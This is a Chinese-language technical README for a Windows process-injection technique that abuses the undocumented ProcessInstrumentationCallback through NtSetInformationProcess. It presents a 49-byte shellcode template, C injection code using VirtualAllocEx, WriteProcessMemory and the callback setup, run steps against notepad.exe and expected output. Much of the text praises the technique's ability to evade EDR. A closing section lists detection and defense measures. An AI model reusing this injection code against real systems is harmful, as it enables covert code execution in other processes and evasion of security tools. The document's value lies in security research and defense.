# SetProcessInjection - ProcessInstrumentationCallback 注入

## 技术概述

SetProcessInjection 是一种利用 Windows 未文档化特性 `ProcessInstrumentationCallback` 实现的进程注入技术。通过 `NtSetInformationProcess` API 设置回调函数，在目标进程执行系统调用时劫持执行流，实现 shellcode 注入。

**原始项目**: https://github.com/OtterHacker/SetProcessInjection
**技术文章**: https://www.riskinsight-wavestone.com/en/2023/10/process-injection-using-ntsetinformationprocess/

## 核心原理

### ProcessInstrumentationCallback 机制

`ProcessInstrumentationCallback` 是 Windows 10 1703+ 引入的未文档化特性，用于在进程执行系统调用时触发回调：

```
用户态应用                     内核态
    |                             |
    | syscall (如 NtReadFile)     |
    |-------------------------->   |
    |                             | 检查是否设置了 InstrumentationCallback
    |                             |
    | <--- 回调到 shellcode        |  (如果设置了)
    |                             |
    | shellcode 执行              |
    |                             |
    | 返回到正常流程 (jmp r10)     |
    |-------------------------->   |
    |                             | 继续执行原系统调用
```

### 关键特点

1. **无需传统 API**: 不使用 `CreateRemoteThread`、`QueueUserAPC` 等常见注入 API
2. **隐蔽性高**: 回调在系统调用时自然触发，难以检测
3. **利用合法机制**: 使用 Windows 内置的进程信息设置功能
4. **自修改检测**: 通过监控 shellcode 首字节变化来确认执行

## 技术细节

### 1. 49 字节 Shellcode 模板

核心 shellcode 结构（位于目标进程）：

```assembly
; 入口
push rbp
mov rbp, rsp

; 自修改标记（11 字节）- 执行后会被修改
mov qword [rip-0xF], 0x00E2FF41  ; 标记区域

; 保存寄存器上下文
push rax
push rbx
push rcx
push r9
push r10
push r11

; 调用 beacon payload
mov rax, <beacon_address>        ; offset 26: 注入 beacon 地址
call rax

; 恢复寄存器上下文
pop r11
pop r10
pop r9
pop rcx
pop rbx
pop rax
pop rbp

; 返回到系统调用原始流程
jmp r10                          ; r10 保存了原始返回地址
```

### 2. 内存布局

```
目标进程地址空间:

┌─────────────────────────────────┐
│  Beacon 内存区域                 │
│  - 权限: PAGE_EXECUTE_READ (RX) │
│  - 内容: MessageBox shellcode   │
│  - 大小: 动态                    │
└─────────────────────────────────┘
         ↑
         │ 被 shellcode 调用
         │
┌─────────────────────────────────┐
│  Shellcode 模板 (49 字节)        │
│  - 权限: PAGE_EXECUTE_READWRITE │
│  - offset 26: beacon 地址        │
│  - 自修改: 首字节会被修改        │
└─────────────────────────────────┘
         ↑
         │ ProcessInstrumentationCallback 指向此处
         │
┌─────────────────────────────────┐
│  PEB (Process Environment Block)│
│  - InstrumentationCallback 字段 │
│    设置为 shellcode 地址         │
└─────────────────────────────────┘
```

### 3. 注入流程

```
1. 获取目标进程句柄
   └─> OpenProcess(PROCESS_ALL_ACCESS, notepad.exe)

2. 准备 Beacon Payload
   ├─> 创建 MessageBox shellcode
   ├─> 解析 user32!MessageBoxA 地址
   └─> Patch 地址到 shellcode 中

3. 分配目标进程内存
   ├─> VirtualAllocEx(beacon_size, PAGE_READWRITE)
   └─> VirtualAllocEx(49, PAGE_READWRITE)

4. 写入 Payload
   ├─> WriteProcessMemory(beacon_content)
   └─> WriteProcessMemory(shellcode_template)

5. 修改内存保护
   ├─> VirtualProtectEx(beacon, PAGE_EXECUTE_READ)
   └─> VirtualProtectEx(shellcode, PAGE_EXECUTE_READWRITE)

6. 设置回调
   └─> NtSetInformationProcess(ProcessInstrumentationCallback)

7. 等待触发
   ├─> 目标进程执行任何系统调用
   ├─> 内核触发 InstrumentationCallback
   ├─> shellcode 执行
   └─> beacon 弹出 MessageBox

8. 监控执行
   └─> ReadProcessMemory(shellcode[0]) 检测首字节变化
```

### 4. 关键 API

#### NtSetInformationProcess

```c
typedef NTSTATUS (NTAPI *pNtSetInformationProcess)(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,  // 40 = ProcessInstrumentationCallback
    PVOID ProcessInformation,                  // 指向结构体
    ULONG ProcessInformationLength             // sizeof(结构体)
);

typedef struct _PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION {
    ULONG Version;      // 必须为 0
    ULONG Reserved;     // 必须为 0
    PVOID Callback;     // shellcode 地址
} PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION;
```

## 实现代码分析

### 核心注入代码

```c
// 1. 分配并写入 beacon
LPVOID beaconAddress = VirtualAllocEx(hProc, NULL, beaconSize,
                                      MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
WriteProcessMemory(hProc, beaconAddress, beaconContent, beaconSize, NULL);
VirtualProtectEx(hProc, beaconAddress, beaconSize, PAGE_EXECUTE_READ, &oldProtect);

// 2. 创建 shellcode 模板
BYTE shellcodeTemplate[49] = {
    0x55,                        // push rbp
    0x48, 0x89, 0xe5,           // mov rbp, rsp
    // ... (自修改标记)
    0x50, 0x53, 0x51, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53,  // 保存寄存器
    0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // mov rax, beacon
    0xff, 0xd0,                  // call rax
    // ... (恢复寄存器)
    0x41, 0xff, 0xe2             // jmp r10
};

// 3. Patch beacon 地址
*(DWORD64*)(shellcodeTemplate + 26) = (DWORD64)beaconAddress;

// 4. 写入 shellcode
LPVOID shellcodeAddress = VirtualAllocEx(hProc, NULL, 49, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
WriteProcessMemory(hProc, shellcodeAddress, shellcodeTemplate, 49, NULL);
VirtualProtectEx(hProc, shellcodeAddress, 49, PAGE_EXECUTE_READWRITE, &oldProtect);

// 5. 设置回调
PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION info;
info.Version = 0;
info.Reserved = 0;
info.Callback = shellcodeAddress;
NtSetInformationProcess(hProc, ProcessInstrumentationCallback, &info, sizeof(info));
```

### 执行监控

```c
// 监控 shellcode 首字节变化
BYTE originalFirstByte = shellcodeTemplate[0];  // 0x55 (push rbp)
BYTE content[1];

while (1) {
    ReadProcessMemory(hProc, shellcodeAddress, &content, 1, &bytesRead);

    if (content[0] != originalFirstByte) {
        printf("[+] Callback executed!\n");
        break;
    }

    Sleep(5000);
}
```

## 与相关技术的对比

### vs Mapping Injection

| 特性 | SetProcessInjection | Mapping Injection |
|-----|---------------------|-------------------|
| 内存分配 | VirtualAllocEx | MapViewOfFile3 |
| 内存写入 | WriteProcessMemory | 直接写入共享内存 |
| 回调设置 | ProcessInstrumentationCallback | ProcessInstrumentationCallback |
| Payload 加密 | 支持 AES-256 (原版) | 无 |
| 复杂度 | 中等 | 较高 |
| API 调用 | 传统 API | 文件映射 API |

### vs CreateRemoteThread

| 特性 | SetProcessInjection | CreateRemoteThread |
|-----|---------------------|-------------------|
| 线程创建 | 无需创建 | 需要 CreateRemoteThread |
| 触发时机 | 系统调用时自动触发 | 立即执行 |
| EDR 检测难度 | 高 | 低 |
| 稳定性 | 依赖目标进程活动 | 立即执行，稳定 |
| 隐蔽性 | 高 | 低 |

## 优势与限制

### 优势

1. **高隐蔽性**: 不使用 `CreateRemoteThread` 等常见 API
2. **合法机制**: 利用 Windows 官方功能
3. **自然触发**: 在系统调用时执行，行为类似正常进程
4. **Payload 保护**: 原版支持 AES 加密（本实现为演示用简化版）

### 限制

1. **需要系统调用触发**: 必须等待目标进程执行系统调用
2. **Windows 版本要求**: 仅支持 Windows 10 1703+ (Build 15063+)
3. **Windows 11 兼容性问题** ⚠️:
   - **已知失败**: Windows 11 Build 26100 (24H2) 及更高版本
   - **错误代码**: `NtSetInformationProcess` 返回 `0xC0000061` (STATUS_PRIVILEGE_NOT_HELD)
   - **原因**: 微软在新版本中限制了未文档化的 `ProcessInstrumentationCallback` 功能
   - **建议**: 在 Windows 10 或更早的 Windows 11 版本（< Build 26100）中测试
4. **权限要求**: 需要 `PROCESS_ALL_ACCESS` 权限
5. **自修改内存**: Shellcode 区域需要 RWX 权限（EDR 可能检测）

## 使用方法

### 编译

```bash
./build.sh
```

### 测试状态

⚠️ **Windows 11 Build 26100 测试失败**

```
测试环境: Windows 11 Build 26100 (24H2)
测试结果: ❌ 失败
失败原因: NtSetInformationProcess 返回 0xC0000061 (STATUS_PRIVILEGE_NOT_HELD)

所有准备工作成功:
✅ OpenProcess(PROCESS_ALL_ACCESS)
✅ VirtualAllocEx (beacon + shellcode)
✅ WriteProcessMemory
✅ VirtualProtectEx (RX/RWX)
❌ NtSetInformationProcess - 系统限制

结论: 这是 Windows 11 的兼容性问题，不是操作错误
      微软在 Build 26100 中限制了 ProcessInstrumentationCallback
```

### 运行

```bash
# 1. 启动目标进程
notepad.exe

# 2. 获取进程 PID
tasklist | grep notepad.exe

# 3. 执行注入（传入 PID）
./setprocess_injection.exe <PID>

# 4. 与 notepad 交互（点击菜单、输入文字等）触发系统调用
# 5. MessageBox 将弹出（仅在支持的 Windows 版本）
```

### 预期输出

```
[*] SetProcessInjection - ProcessInstrumentationCallback Injection
[+] Found target process: PID 1234
[+] Starting ProcessInstrumentationCallback deployment!
[+] Beacon memory allocated at: 0x000001A2B3C4D000
[+] Shellcode memory allocated at: 0x000001A2B3C5E000
[+] Beacon content written at 0x000001A2B3C4D000
[+] Shellcode content written at 0x000001A2B3C5E000
[+] Beacon memory reprotected to RX
[+] Shellcode memory reprotected to RWX
[+] ProcessInstrumentationCallback deployed successfully!

[*] Monitoring callback execution...
[!] Interact with notepad.exe (type, click menu, etc.) to trigger the callback
[-] Waiting 5 seconds for the hook to be called... (attempt 1)
        [-] First byte value: 0x55 (original: 0x55)
[-] Waiting 5 seconds for the hook to be called... (attempt 2)
        [-] First byte value: 0x41 (original: 0x55)

[+] Callback executed! Your payload should have run!
[+] Check for the MessageBox in notepad.exe
```

## 检测与防御

### 检测方法

1. **监控 NtSetInformationProcess 调用**:
   ```c
   NtSetInformationProcess(*, ProcessInstrumentationCallback, *, *)
   ```

2. **检查进程 PEB 结构**:
   - 读取 `InstrumentationCallback` 字段
   - 检查是否指向非法模块

3. **监控 RWX 内存区域**:
   - Shellcode 区域需要 `PAGE_EXECUTE_READWRITE` 权限

4. **行为分析**:
   - VirtualAllocEx + WriteProcessMemory + NtSetInformationProcess 组合

### 防御建议

1. **EDR/AV 规则**:
   - 监控 `ProcessInstrumentationCallback` 设置
   - 检测跨进程内存写入 + 回调设置组合

2. **内核回调检测**:
   - 驱动层面监控 `PsSetProcessInstrumentationCallback` 内核调用

3. **内存扫描**:
   - 定期扫描进程的 InstrumentationCallback 字段
   - 检查指向的内存区域是否合法

## 技术参考

- **原始项目**: https://github.com/OtterHacker/SetProcessInjection
- **技术文章**: https://www.riskinsight-wavestone.com/en/2023/10/process-injection-using-ntsetinformationprocess/
- **相关技术**: Mapping Injection (技术 35)
- **MSDN**: `NtSetInformationProcess` (未文档化)

## 许可证

本实现仅用于安全研究和教育目的。
